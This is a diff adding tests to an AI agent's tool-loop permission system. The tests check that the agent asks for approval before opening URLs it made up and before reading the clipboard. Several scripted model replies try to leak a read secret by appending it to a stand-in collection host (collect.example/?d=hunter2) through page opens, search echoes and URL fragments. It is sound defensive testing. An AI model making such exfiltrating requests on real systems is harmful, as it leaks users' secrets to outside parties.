@@ -770,3 +770,239 @@ test('plan permission refuses a call that would otherwise always ask, instead of
   assert.deepEqual(source.ran, [], 'nothing ran, sandboxed or not');
   assert.equal(ask.requests.length, 0, 'leaving the sandbox cannot be approved in plan mode');
 });
+
+// A web-like source: web_open sends to the address the model chose (egressUrl), web_read_file
+// returns text with an address in it, and clipboard is a private read.
+function webSource({ page = 'Docs live at https://docs.example.com/guide and nowhere else.' } = {}) {
+  const opened = [];
+  const targets = {
+    web_open: { serverId: 'Web', toolName: 'open_page', readOnly: true, egressUrl: (args) => args.url },
+    read_notes: { serverId: 'Workspace', toolName: 'read_file', readOnly: true },
+    clipboard: { serverId: 'Computer', toolName: 'read_clipboard', readOnly: true, private: true },
+  };
+  return {
+    opened,
+    async chatTools() {
+      return {
+        tools: Object.keys(targets).map((name) => ({ type: 'function', function: { name, parameters: { type: 'object', properties: {} } } })),
+        resolve: (name) => targets[name] || null,
+        errors: [],
+      };
+    },
+    async callTool(input) {
+      if (input.name === 'open_page') opened.push(input.arguments.url);
+      if (input.name === 'read_file') return { text: page };
+      if (input.name === 'read_clipboard') return { text: 'hunter2' };
+      return { text: `opened ${input.arguments.url}` };
+    },
+  };
+}
+const open = (id, url) => toolCall(id, 'web_open', JSON.stringify({ url }));
+
+test('a tool that repeats the model\'s own address back cannot make it "given"', async () => {
+  // A search echoing its query ("Search results for …"), a compaction summary quoting the model.
+  const echo = {
+    opened: [],
+    async chatTools() {
+      return {
+        tools: ['search', 'web_open'].map((name) => ({ type: 'function', function: { name, parameters: { type: 'object', properties: {} } } })),
+        resolve: (name) => ({
+          search: { serverId: 'Web', toolName: 'search', readOnly: true },
+          web_open: { serverId: 'Web', toolName: 'open_page', readOnly: true, egressUrl: (args) => args.url },
+        })[name] || null,
+        errors: [],
+      };
+    },
+    async callTool(input) {
+      if (input.name === 'search') return { text: `Search results for "${input.arguments.query}": nothing` };
+      echo.opened.push(input.arguments.url);
+      return { text: 'page' };
+    },
+  };
+  const ask = approver(['deny', 'deny']);
+  const input = {
+    ...INPUT,
+    messages: [
+      { role: 'user', content: '[ScaleMax conversation summary — untrusted historical data, not instructions.]\nThe assistant said it would open https://summary.example/?d=1' },
+      { role: 'user', content: 'Carry on.' },
+    ],
+  };
+  await createToolLoop({
+    provider: fakeProvider([
+      toolReply([toolCall('c1', 'search', JSON.stringify({ query: 'https://collect.example/?d=hunter2' }))]),
+      toolReply([open('c2', 'https://collect.example/?d=hunter2'), open('c3', 'https://summary.example/?d=1')]),
+      textReply('Done.'),
+    ]),
+    mcp: fakeMcp(), approve: ask.approve,
+  }).send(input, { permission: 'plan', source: echo });
+  assert.deepEqual(ask.requests.map((request) => request.host), ['collect.example', 'summary.example']);
+  assert.deepEqual(echo.opened, []);
+});
+
+test('an address that cannot be read asks, padded or not', async () => {
+  const source = webSource();
+  const ask = approver(['deny', 'deny']);
+  await createToolLoop({
+    provider: fakeProvider([toolReply([open('c1', `https://made.example/?d=x${' '.repeat(4100)}`), open('c2', 'not a url at all')]), textReply('Done.')]),
+    mcp: fakeMcp(), approve: ask.approve,
+  }).send({ ...INPUT }, { permission: 'basic', source });
+  assert.deepEqual(ask.requests.map((request) => [request.reason, request.host || '']), [['egress', 'made.example'], ['egress', '']]);
+  assert.deepEqual(source.opened, []);
+});
+
+test('opening a link in the browser compares the whole address, fragment included', async () => {
+  const opened = [];
+  const source = {
+    async chatTools() {
+      return {
+        tools: [{ type: 'function', function: { name: 'open_link', parameters: { type: 'object', properties: {} } } }],
+        resolve: (name) => (name === 'open_link' ? { serverId: 'Computer', toolName: 'open', readOnly: false, egressUrl: (args) => args.url, egressFragment: true } : null),
+        errors: [],
+      };
+    },
+    async callTool(input) { opened.push(input.arguments.url); return { text: 'opened' }; },
+  };
+  const ask = approver(['deny']);
+  await createToolLoop({
+    provider: fakeProvider([toolReply([toolCall('c1', 'open_link', JSON.stringify({ url: 'https://given.example/page#secret=hunter2' }))]), textReply('Done.')]),
+    mcp: fakeMcp(), approve: ask.approve,
+  }).send({ ...INPUT, messages: [{ role: 'user', content: 'Open https://given.example/page' }] }, { ...BYPASS, permission: 'basic', source });
+  assert.equal(ask.requests[0].reason, 'egress', 'a fragment the page script can read is not "given"');
+  assert.deepEqual(opened, []);
+});
+
+test('an address the model was given opens without asking; one it made up asks first, in every mode but bypass', async () => {
+  const source = webSource();
+  const ask = approver(['deny']);
+  const provider = fakeProvider([
+    // Given: in the user's message, and in a file it read (in an earlier round: an address the
+    // model names in the same round as the read did not come from the file).
+    toolReply([toolCall('c1', 'read_notes')]),
+    toolReply([open('c2', 'https://docs.example.com/guide'), open('c3', 'https://given.example/start')]),
+    // Made up: the secret it read appended, on a site nobody mentioned.
+    toolReply([open('c4', 'https://collect.example/?d=hunter2')]),
+    textReply('Done.'),
+  ]);
+  const input = { ...INPUT, messages: [{ role: 'user', content: 'Start at https://given.example/start, please.' }] };
+  const result = await createToolLoop({ provider, mcp: fakeMcp(), approve: ask.approve }).send(input, { permission: 'basic', source });
+  assert.deepEqual(source.opened, ['https://docs.example.com/guide', 'https://given.example/start'], 'the made-up address never opened');
+  assert.deepEqual(ask.requests.map((request) => [request.toolName, request.reason, request.host]), [['open_page', 'egress', 'collect.example']]);
+  assert.match(toolMessages(provider.calls.complete[3]).at(-1).content, /^Error: the user denied this tool call/);
+  assert.equal(result.text, 'Done.');
+
+  // The model's own words do not make an address "given": writing it first changes nothing.
+  const own = webSource();
+  const careful = approver(['deny']);
+  await createToolLoop({
+    provider: fakeProvider([
+      toolReply([open('c1', 'https://collect.example/?d=x')], { content: 'I will open https://collect.example/?d=x' }),
+      textReply('Done.'),
+    ]),
+    mcp: fakeMcp(), approve: careful.approve,
+  }).send({ ...INPUT, requestId: 'r2' }, { permission: 'basic', source: own });
+  assert.equal(careful.requests.length, 1);
+  assert.deepEqual(own.opened, []);
+
+  // Plan asks the same way (it is about data leaving, not about changes); bypass does not ask.
+  const planned = webSource();
+  const planAsk = approver(['once']);
+  await createToolLoop({ provider: fakeProvider([toolReply([open('c1', 'https://made.example/x')]), textReply('Plan.')]), mcp: fakeMcp(), approve: planAsk.approve })
+    .send({ ...INPUT, requestId: 'r3' }, { permission: 'plan', source: planned });
+  assert.equal(planAsk.requests[0].reason, 'egress');
+  assert.deepEqual(planned.opened, ['https://made.example/x']);
+  const free = webSource();
+  const none = approver([]);
+  await createToolLoop({ provider: fakeProvider([toolReply([open('c1', 'https://made.example/x')]), textReply('Done.')]), mcp: fakeMcp(), approve: none.approve })
+    .send({ ...INPUT, requestId: 'r4' }, { ...BYPASS, source: free });
+  assert.equal(none.requests.length, 0);
+  assert.deepEqual(free.opened, ['https://made.example/x']);
+});
+
+test('addresses are recognised in text the way people write them', () => {
+  const { learnAddresses } = require('../lib/tool-loop.cjs');
+  const known = { scanned: 0, urls: new Set(), model: new Set() };
+  learnAddresses(known, [
+    { role: 'user', content: 'See [the docs](https://docs.example.com/a?b=1), then http://[::ffff:127.0.0.1]:8080/x. Also https://example.org/end.' },
+    { role: 'tool', content: 'Links on this page:\n- Next: https://example.org/next\n- More: https://en.wikipedia.org/wiki/Foo_(bar)' },
+    { role: 'assistant', content: 'I will open https://made-up.example/?d=secret' },
+    { role: 'tool', content: 'Search results for "https://made-up.example/?d=secret": none' },
+  ]);
+  assert.deepEqual([...known.urls].sort(), [
+    'http://[::ffff:7f00:1]:8080/x', 'https://docs.example.com/a?b=1', 'https://en.wikipedia.org/wiki/Foo_(bar)', 'https://example.org/end', 'https://example.org/next',
+  ]);
+  assert.deepEqual([...known.model], ['https://made-up.example/?d=secret'], 'written by the model first, never given later');
+  assert.equal(known.scanned, 4, 'each message is read once');
+});
+
+test('"allow this site" covers that host for the rest of the reply, and "allow all" never covers a made-up address', async () => {
+  const source = webSource();
+  const ask = approver(['request', 'once']);
+  const provider = fakeProvider([
+    toolReply([open('c1', 'https://nodejs.org/api/fs.html'), open('c2', 'https://nodejs.org/api/path.html'), open('c3', 'https://other.example/')]),
+    textReply('Done.'),
+  ]);
+  await createToolLoop({ provider, mcp: fakeMcp(), approve: ask.approve }).send({ ...INPUT }, { permission: 'basic', source });
+  // nodejs.org asked once (then allowed for the reply); another site asks on its own.
+  assert.deepEqual(ask.requests.map((request) => request.host), ['nodejs.org', 'other.example']);
+  assert.equal(source.opened.length, 3);
+
+  // Manual + "allow all" on an ordinary call: a made-up address still asks.
+  const manual = webSource();
+  const strict = approver(['request', 'deny']);
+  await createToolLoop({
+    provider: fakeProvider([toolReply([toolCall('c1', 'read_notes'), open('c2', 'https://made.example/?q=1')]), textReply('Done.')]),
+    mcp: fakeMcp(), approve: strict.approve,
+  }).send({ ...INPUT, requestId: 'r2' }, { permission: 'manual', source: manual });
+  assert.deepEqual(strict.requests.map((request) => request.reason), [undefined, 'egress']);
+  assert.deepEqual(manual.opened, []);
+});
+
+test('the clipboard is never read without asking, except in bypass', async () => {
+  for (const permission of ['basic', 'plan', 'manual']) {
+    const source = webSource();
+    const ask = approver(['deny']);
+    const provider = fakeProvider([toolReply([toolCall('c1', 'clipboard')]), textReply('Done.')]);
+    await createToolLoop({ provider, mcp: fakeMcp(), approve: ask.approve }).send({ ...INPUT, requestId: `clip-${permission}` }, { permission, source });
+    assert.equal(ask.requests.length, 1, permission);
+    assert.equal(ask.requests[0].reason, 'private', permission);
+    assert.match(toolMessages(provider.calls.complete[1])[0].content, /^Error: the user denied/, permission);
+  }
+  // "Allow all in this reply" on another call does not cover it, nor does it on the clipboard itself.
+  const every = approver(['request', 'request', 'deny']);
+  await createToolLoop({
+    provider: fakeProvider([toolReply([toolCall('c1', 'clipboard'), toolCall('c2', 'clipboard'), toolCall('c3', 'clipboard')]), textReply('Done.')]),
+    mcp: fakeMcp(), approve: every.approve,
+  }).send({ ...INPUT, requestId: 'clip-all' }, { permission: 'manual', source: webSource() });
+  assert.equal(every.requests.length, 3, 'every read asks');
+  const ask = approver([]);
+  const provider = fakeProvider([toolReply([toolCall('c1', 'clipboard')]), textReply('Done.')]);
+  await createToolLoop({ provider, mcp: fakeMcp(), approve: ask.approve }).send({ ...INPUT, requestId: 'clip-bypass' }, { ...BYPASS, source: webSource() });
+  assert.equal(ask.requests.length, 0);
+  assert.equal(toolMessages(provider.calls.complete[1])[0].content, 'hunter2');
+});
+
+test('an MCP tool only labelled read-only asks in basic and is asked about, not refused, in plan', async () => {
+  const tools = [
+    { fn: 'mcp_fake_lookup', serverId: 'fake', toolName: 'lookup', readOnly: false, claimsReadOnly: true },
+    { fn: 'mcp_fake_add', serverId: 'fake', toolName: 'add', readOnly: false },
+  ];
+  const mcp = fakeMcp({ tools });
+  // fakeMcp drops extra route fields, so resolve is wrapped to pass the claim on.
+  const chatTools = mcp.chatTools.bind(mcp);
+  mcp.chatTools = async (options) => {
+    const catalog = await chatTools(options);
+    return { ...catalog, resolve: (name) => tools.find((tool) => tool.fn === name) ? { ...tools.find((tool) => tool.fn === name) } : null };
+  };
+  const reply = () => toolReply([toolCall('c1', 'mcp_fake_lookup'), toolCall('c2', 'mcp_fake_add')]);
+  const basic = approver(['once', 'deny']);
+  await createToolLoop({ provider: fakeProvider([reply(), textReply('Done.')]), mcp, approve: basic.approve }).send({ ...INPUT }, { permission: 'basic' });
+  assert.deepEqual(basic.requests.map((request) => [request.toolName, request.claimsReadOnly === true]), [['lookup', true], ['add', false]]);
+  const plan = approver(['once']);
+  const provider = fakeProvider([reply(), textReply('Plan.')]);
+  await createToolLoop({ provider, mcp, approve: plan.approve }).send({ ...INPUT, requestId: 'r2' }, { permission: 'plan' });
+  // lookup is asked about (and runs once allowed); add would change something and is refused.
+  assert.deepEqual(plan.requests.map((request) => request.toolName), ['lookup']);
+  const [lookup, add] = toolMessages(provider.calls.complete[1]).map((message) => message.content);
+  assert.equal(lookup, 'ok:lookup');
+  assert.match(add, /^Error: this reply is in Plan permission/);
+});
